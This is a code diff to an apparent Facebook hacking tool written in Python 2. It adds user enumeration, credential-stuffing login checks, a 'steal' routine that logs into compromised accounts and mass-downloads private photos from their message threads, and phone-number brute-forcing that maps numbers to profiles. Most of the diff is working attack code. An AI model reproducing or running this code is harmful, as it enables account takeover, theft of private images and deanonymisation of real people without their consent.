@@ -19,6 +19,7 @@ from base64 import b64encode
 import logging
 from mechanize import Request
 
+blocked = 0
 masterCj = ''
 
 def setGlobalLogginng():
@@ -35,7 +36,7 @@ def setMail():
 
 
 def login(email, password,state):
-    
+    global blocked
     cookieHandler = customCookies()
     # Empty the cookies
     cj.clear()
@@ -80,6 +81,7 @@ def login(email, password,state):
         if cookieHandler.isLogged(cj) == True:
             #Checkpoint exists (?) 
             if cookieHandler.checkPoint(cj) == True:
+                    blocked = 1
                     print 'Error - Checkpoint reached, your account may be blocked'
                     return -1
             # Assign cookies to array
@@ -1409,34 +1411,46 @@ def analyzeGraph(victim):
         #Associated with node number
         print 'Attemping to get user\'s information'
         for elements in idkeys.keys():
-            user = getName(elements)
-            commonPages[user] = corePagesLike(victim,elements)
-            userNames.append(user)
-            nodekeys[idkeys[elements]] = user
-            percentage = (i * 100.0)/len(idkeys.keys())
-            print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(idkeys.keys()), percentage), 
-            i+=1
-        
+            try:
+                user = getName(elements)
+                commonPages[user] = corePagesLike(victim,elements)
+                userNames.append(user)
+                nodekeys[idkeys[elements]] = user
+                percentage = (i * 100.0)/len(idkeys.keys())
+                print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(idkeys.keys()), percentage), 
+                i+=1
+            except:
+                continue
+            
         reference = open( os.path.join(root,directory,victim+"references.txt") ,"wb")    
         for users in nodekeys.keys():
-            line = str(nodekeys[users])+' : '+str(users) 
-            reference.write(line + '\n')
+            try:
+                line = str(nodekeys[users])+' : '+str(users) 
+                reference.write(line + '\n')
+            except:
+                continue
             
         reference.close()
         
         for node in nodes:
-            edges[node] = myGraph.degree(node)
-            if edgesValues.has_key(edges[node]):
-                edgesValues[edges[node]].append(node)
-            else:
-                edgesValues[edges[node]] = [node]
+            try:
+                edges[node] = myGraph.degree(node)
+                if edgesValues.has_key(edges[node]):
+                    edgesValues[edges[node]].append(node)
+                else:
+                    edgesValues[edges[node]] = [node]
+            except:
+                continue
     
         
         for values in sorted(edgesValues.keys(),reverse=True):
-            print str(values) + ' aristas; nodos: ',
-            for nodes in edgesValues[values]:
-                print str(nodes) + ', ',
-            print '\n'
+            try:
+                print str(values) + ' aristas; nodos: ',
+                for nodes in edgesValues[values]:
+                    print str(nodes) + ', ',
+                print '\n'
+            except:
+                continue
         
         print nx.is_connected(myGraph)
         
@@ -1452,16 +1466,24 @@ def analyzeGraph(victim):
         labelGraph = nx.Graph()
         
         for label in labelNodes:
-            labelGraph.add_node(nodekeys[int(label)],likes=commonPages[nodekeys[int(label)]])
-        
+            try:
+                labelGraph.add_node(nodekeys[int(label)],likes=commonPages[nodekeys[int(label)]])
+            except:
+                continue
+            
         for labelE in labelEdges:
-            labelGraph.add_edge(nodekeys[int(labelE[0])],nodekeys[int(labelE[1])])
-        
-        nx.draw_spring(labelGraph,node_color = np.linspace(0,1,len(labelGraph.nodes())),edge_color = np.linspace(0,1,len(labelGraph.edges())) ,with_labels=True)
-        plt.savefig( os.path.join(root,directory,victim+"labelGraph_color.pdf") )
-        plt.savefig( os.path.join(root,directory,victim+"labelGraph_color.png") )
-        write_dot(labelGraph, os.path.join(root,directory,victim+"labelGraph_color.dot") )    
-        plt.show()
+            try:
+                labelGraph.add_edge(nodekeys[int(labelE[0])],nodekeys[int(labelE[1])])
+            except:
+                continue
+        try:   
+            nx.draw_spring(labelGraph,node_color = np.linspace(0,1,len(labelGraph.nodes())),edge_color = np.linspace(0,1,len(labelGraph.edges())) ,with_labels=True)
+            plt.savefig( os.path.join(root,directory,victim+"labelGraph_color.pdf") )
+            plt.savefig( os.path.join(root,directory,victim+"labelGraph_color.png") )
+            write_dot(labelGraph, os.path.join(root,directory,victim+"labelGraph_color.dot") )    
+            plt.show()
+        except:
+            print 'Erro plotting the graph'
         
         #Saving the object for future analysis
         f = open( os.path.join("dumps",victim,"objects",victim+"-community") ,"wb")
@@ -1472,9 +1494,11 @@ def analyzeGraph(victim):
         partition = community.best_partition(labelGraph)
         
         for i in set(partition.values()):
-            print "Community", i
-            members = [nodes for nodes in partition.keys() if partition[nodes] == i]
-            
+            try:
+                print "Community", i
+                members = [nodes for nodes in partition.keys() if partition[nodes] == i]
+            except:
+                continue    
             ''' No longer necessary (?) 
             reference = open(root+"\\"+directory+"\\community"+str(i)+"references.txt","wb")
             
@@ -1484,17 +1508,19 @@ def analyzeGraph(victim):
             
             reference.close()           
             ''' 
-            
-            egonet = labelGraph.subgraph(set(members))
-            print sorted(egonet.nodes(),reverse=False)
-            print sorted(egonet.edges(),reverse=False)
-            
+            try:
+                egonet = labelGraph.subgraph(set(members))
+                print sorted(egonet.nodes(),reverse=False)
+                print sorted(egonet.edges(),reverse=False)
                 
-            nx.draw_spring(egonet,node_color = np.linspace(0,1,len(egonet.nodes())),edge_color = '#000000' ,with_labels=True)
-            plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".pdf") )
-            plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".png") )
-            write_dot(egonet, os.path.join(root,directory,victim+"Community"+str(i)+".dot") )   			
-            plt.show()
+                    
+                nx.draw_spring(egonet,node_color = np.linspace(0,1,len(egonet.nodes())),edge_color = '#000000' ,with_labels=True)
+                plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".pdf") )
+                plt.savefig( os.path.join(root,directory,victim+"Community"+str(i)+".png") )
+                write_dot(egonet, os.path.join(root,directory,victim+"Community"+str(i)+".dot") )   			
+                plt.show()
+            except:
+                print 'Error plotting the graph'
            
             
         raw_input('Press enter to continue...\n')
@@ -1820,7 +1846,7 @@ def checkPrivacy(victim):
             matchBis = re.search('Todos los amigos',resultado)
             matchBisBis = re.search('Todos mis amigos',resultado)
             if ((match is not None) or (matchBis is not None) or (matchBisBis is not None)):
-                matchFriends = re.search('id="friendsTypeaheadResults(.+)"',resultado).group()
+                matchFriends = re.search('_1qp6(.+)"',resultado).group()
                 return matchFriends 
             else:
                 return -1
@@ -2877,8 +2903,8 @@ def friendlyLogout(noteID,privacy):
         'xhpc_timeline' : '',
         'xhpc_targetid' : getC_user(),
         'xhpc_publish_type' : '1',
-        'xhpc_message_text' : '#FBHT rocks! https://github.com/chinoogawa/fbht/',
-        'xhpc_message' : '#FBHT rocks! https://github.com/chinoogawa/fbht/',
+        'xhpc_message_text' : '#FBHT rocks! #HackThePlanet! @chinoogawa  powered by @MkitArgentina ',
+        'xhpc_message' : '#FBHT rocks! #HackThePlanet! @chinoogawa  powered by @MkitArgentina ',
         'is_explicit_place' : '',
         'composertags_place' : '',
         'composertags_place_name' : '',
@@ -2921,3 +2947,243 @@ def friendlyLogout(noteID,privacy):
         logs('Error in the friendlyLogout module')
         print '\rError in the friendlyLogout module\r'
         raise    
+
+def takePhotos(threads):
+    r = open(os.path.join("massive","fotos.txt"),"wb")
+    fb_dtsg = set_dtsg()
+    f = open(os.path.join("massive",threads),"r")
+    threadList = []
+    while True:
+        linea = f.readline()
+        if not linea:
+            break
+        threadList.append(str(linea.strip("\n")))
+    
+    i = 0
+    
+    for message in threadList:
+        arguments = {
+            'thread_id' : message,
+            'offset' : '0',
+            'limit' : '30',
+            '__user' : getC_user(),
+            '__a' : '1',
+            '__dyn' : 'aJj2BW9t2lm9b88DgDDx2IGAKh9VoW9J6yUgByVbFkGQhbHz6C-CEy5pokAWAVbGFQiuaBKAqhB-imSCiZ3oyq4U',
+            '__req' : '40',
+            'fb_dtsg' : fb_dtsg,
+            'ttstamp' : '265816973899779122887410295',
+            '__rev' : '1458973'
+            }
+        
+        datos = urlencode(arguments)
+        try:
+            response = br.open('https://www.facebook.com/ajax/messaging/attachments/sharedphotos.php',datos)
+            text = response.read()
+            r.write(text + '\n')
+        except mechanize.HTTPError as e:
+            logs(e.code)
+            print e.code
+        except mechanize.URLError as e:
+            logs(e.reason.args)
+            print e.reason.args    
+        except:
+            logs('Error in robo de fotos')
+            print '\rError in robo de fotos\r'
+            raise        
+        
+        try:
+            to_parse = str(text).strip('for (;;);')
+            resultado = json.loads(to_parse)
+            
+            URLS = []
+            for element in resultado['payload']['imagesData'].keys():
+                URLS.append(resultado['payload']['imagesData'][element]['URI'])
+            
+            for URL in URLS:
+                fotos = open(os.path.join('massive','photos',str(int(time()))+'.jpg'),"wb")
+                handler = br.open(URL)
+                fotos.write(handler.read())
+                fotos.close()
+                i += 1
+                
+            URLS[:]
+        except:
+            print 'no attachment in thread'
+        
+    r.close()
+    
+def accountexists(mailList):
+    
+    password = '#FBHTEnumerateUsers'
+    mails = []
+    try:
+        mailFile = open(os.path.join("PRIVATE",mailList),"r")
+    except:
+        print 'File %s doesn\'t exist' %mailList
+        return 
+    try:
+        verified = open(os.path.join("PRIVATE","existence","verified.txt"),"a")
+        verified.close()
+    except:
+        verified = open(os.path.join("PRIVATE","existence","verified.txt"),"w")
+        verified.close()
+        
+    while True:
+        line = mailFile.readline()
+        if not line: break
+        mails.append(line.strip('\n'))
+    
+    mailFile.close()
+    
+    for email in mails:
+        cookieHandler = customCookies()
+        # Empty the cookies
+        cj.clear()
+        # Access the login page to get the forms
+        try:
+            br.open('https://login.facebook.com/login.php')
+            br.select_form(nr=0)
+        except mechanize.HTTPError as e:
+            logs(str(e.code) + ' on login module')
+            print str(e.code) + ' on login module'
+            continue
+        except mechanize.URLError as e:
+            logs(str(e.reason.args) + ' on login module')
+            print str(e.reason.args) + ' on login module'
+            continue
+        except:
+            logs("Can't Access the login.php form")
+            print "\rCan't Access the login.php form\r"
+            continue
+            # Select the first form
+        
+            
+        # Set email and pass to the form
+        try:
+            br.form['email'] = email
+            br.form['pass'] = password
+        except:
+            logs("Something bad happen.. Couldn't set email and password")
+            print "\rSomething bad happen.. Couldn't set email and password\r"
+        # Send the form
+        try:
+            response = br.submit()
+            line = response.read()
+            match = re.search('Por favor, vuelve a introducir tu contrase',line)
+            if match is not None:
+                print email + ' Cuenta existente'
+                verified = open(os.path.join("PRIVATE","existence","verified.txt"),"a")
+                verified.write(email + '\n')
+                verified.close()
+            else:
+                print email + ' Cuenta inexistente'
+        except:
+            logs('Fatal error while submitting the login form')
+            print '\rFatal error while submitting the login form\r'
+
+    verified.close()
+
+def checkLogin(mailList):
+    global blocked
+    
+    try:
+        verified = open(os.path.join("PRIVATE","loggedin","Loggedin.txt"),"a")
+    except:
+        verified = open(os.path.join("PRIVATE","loggedin","Loggedin.txt"),"w")
+    try:    
+        mails = open(os.path.join("PRIVATE",mailList),"r")
+    except:
+        print '%s doesn\'t exist in PRIVATE folder' %mailList
+        verified.close()
+        return
+    
+    credenciales = {}
+    while True:
+        email = mails.readline()
+        if not email: break
+        index = email.find(":")
+        if index != -1:
+            credenciales[email[0:index]] = email[index+1:].strip('\n')
+            
+    for emails in credenciales.keys():
+        if (login(emails,credenciales[emails],'real') != -1) or (blocked == 1):
+            verified = open(os.path.join("PRIVATE","loggedin","Loggedin.txt"),"a")
+            verified.write(emails+':'+credenciales[emails]+'\n')
+            verified.close()
+            print emails + ' valid email and passowrd!!! MOTHER KAKERRRRR :D '
+            blocked = 0
+        else:
+            print emails + ' not valid email or password'
+    
+    try:
+        verified.close()
+    except:
+        return
+
+def steal():
+    global blocked
+    try:
+        verified = open(os.path.join("PRIVATE","loggedin","Loggedin.txt"),"r")
+    except:
+        print 'File Loggedin.txt not found in loggedin folder, you should try it again!'
+        return
+    
+    credenciales = {}
+    while True:
+        email = verified.readline()
+        if not email: break
+        index = email.find(":")
+        if index != -1:
+            credenciales[email[0:index]] = email[index+1:].strip('\n')
+            
+    for emails in credenciales.keys():
+        if (login(emails,credenciales[emails],'real') != -1) or (blocked == 1):
+            print emails + ' valid email and passowrd!!! MOTHER KAKERRRRR :D '
+            if blocked == 1:
+                blocked = 0
+                print 'Account valid, but blocked due to location issues'
+            else:
+                check = checkPrivacy('me')
+                friendList, friendsName = friendshipPlot(check,'me')
+                fileThreads = open(os.path.join("massive","threads.txt"),"wb")
+                for friends in friendList:
+                    fileThreads.write(friends+'\n')
+                fileThreads.close()
+                takePhotos("threads.txt")
+        else:
+            sleep(10)
+            print emails + ' not valid email or password'
+            
+def bruteforceCel(first,start,end):
+    c_user = getC_user()
+    try:
+        f = open('cellphones\\cellphones.txt','a')
+        f.close()
+    except:
+        f = open('cellphones\\cellphones.txt','wb')
+        f.close()
+    percentage = 0.0
+    verified = 0
+    for cellphone in range(int(start),int(end)):
+        percentage = ((cellphone-int(start)) * 100.0) / (int(end) - int(start))
+        print '\rCompleted [%.6f%%] - %d cellphone - %d verified\r' %(percentage, cellphone, verified),
+        try:
+            response = br.open('https://www.facebook.com/typeahead/search/facebar/query/?value=["'+first+str(cellphone)+'"]&context=facebar&grammar_version=7466c20ac89f47d6185f3a651461c1b1bac9a82d&content_search_mode&viewer='+c_user+'&rsp=search&qid=8&max_results=10&sid=0.24097281275317073&__user='+c_user+'&__a=1&__dyn=7nmajEyl2qm9udDgDxyIGzGpUW9ACxO4p9GgyimEVFLFwxBxCbzESu49UJ6K59poW8xHzoyfw&__req=1o&__rev=1536505')
+            text = response.read()
+            json_dump = json.loads(text.strip('for (;;);'))
+            #print str(json_dump['payload']['entities'][0]['path'])
+            #print str(json_dump['payload']['entities'][0]['uid'])
+            #print first + str(cellphone)
+            f = open('cellphones\\cellphones.txt','a')
+            f.write(first + str(cellphone)+' '+str(json_dump['payload']['entities'][0]['path']) + ' ' + str(json_dump['payload']['entities'][0]['uid'])+'\n')
+            f.close()
+            verified += 1
+        except mechanize.HTTPError as e:
+            logs(e.code)
+            print e.code
+        except mechanize.URLError as e:
+            logs(e.reason.args)
+            print e.reason.args    
+        except:
+            f.close()
+            continue
